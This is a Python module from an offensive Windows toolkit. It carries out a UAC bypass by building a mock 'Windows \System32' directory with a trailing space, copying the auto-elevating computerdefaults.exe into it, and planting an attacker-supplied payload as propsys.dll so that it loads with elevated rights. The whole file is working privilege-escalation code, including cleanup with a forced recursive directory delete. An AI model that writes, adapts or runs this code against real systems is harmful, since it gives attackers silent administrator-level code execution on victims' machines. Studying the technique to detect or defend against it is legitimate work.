import os
import time
import shutil
from winpwnage.core.prints import *
from winpwnage.core.utils import *

#https://medium.com/tenable-techblog/uac-bypass-by-mocking-trusted-directories-24a96675f6e

computerdefaults_dll_info = {
	"Description": "Bypass UAC using computerdefaults (DLL) and mock systemroot directory",
	"Id": "23",
	"Type": "UAC bypass",
	"Fixed In": "Untested",
	"Works From": "Untested",
	"Admin": False,
	"Function Name": "computerdefaults_dll",
	"Function Payload": True,
}


def computerdefaults_dll(payload):
	if payloads().dll(payload):
		if os.path.isfile("\\\?\\{} \\System32\\computerdefaults.exe".format(information().windows_directory())) == True:
			try:
				os.system('rd /S /Q "\\\?\\{} "'.format(information().windows_directory()))
			except Exception as error:
				print_error("Unable to proceed, unable to clean folder (\\\?\\{} \\System32\\)".format(information().windows_directory()))
				return False
			else:
				pass

		try:
			os.mkdir("\\\?\\{} ".format(information().windows_directory()))
		except Exception as error:
			print_error("Unable to create mock WINDIR directory")
			return False
		else:
			try:
				os.mkdir("\\\?\\{} \\System32".format(information().windows_directory()))
			except Exception as error:
				print_error("Unable to create mock SYSTEM32 directory")
				return False
			else:
				print_success("Successfully created mock directories (\\\?\\{} \\System32)".format(information().windows_directory()))

		time.sleep(5)

		print_info("Disabling file system redirection")
		with disable_fsr():
			print_success("Successfully disabled file system redirection")
			try:
				shutil.copy(os.path.join(information().system_directory(),"computerdefaults.exe"),"\\\?\\{} \\System32\\computerdefaults.exe".format(information().windows_directory()))
			except Exception as error:
				print_error("Unable to make copy of computerdefaults.exe")
				return False
			else:
				print_success("Successfully created a copy of computerdefaults.exe to our directory")
				try:
					payload_data = open(os.path.join(payload), "rb").read()
				except Exception as error:
					print_error("Unable to read payload data")
					return False
				else:
					try:
						dll_file = open("\\\?\\{} \\System32\\propsys.dll".format(information().windows_directory()), "wb")
						dll_file.write(payload_data)
						dll_file.close()
					except Exception as error:
						print_error("Unable to save our payload to directory")
						return False
					else:
						print_success("Successfully dropped our dll file")

			time.sleep(5)

			if process().create("\\\?\\{} \\System32\\computerdefaults.exe".format(information().windows_directory())):
				print_success("Successfully spawned process (\\\?\\{} \\System32\\computerdefaults.exe)".format(information().windows_directory()))
			else:
				print_error("Unable to spawn process")
				return False

			time.sleep(5)

		try:
			os.system('rd /S /Q "\\\?\\{} "'.format(information().windows_directory()))
		except Exception as error:
			print_error("Unable to clean, manually cleaning is needed!")
			return False
		else:
			print_success("Successfully cleaned up, enjoy!")
	else:
		print_error("Cannot proceed, invalid payload")
		return False
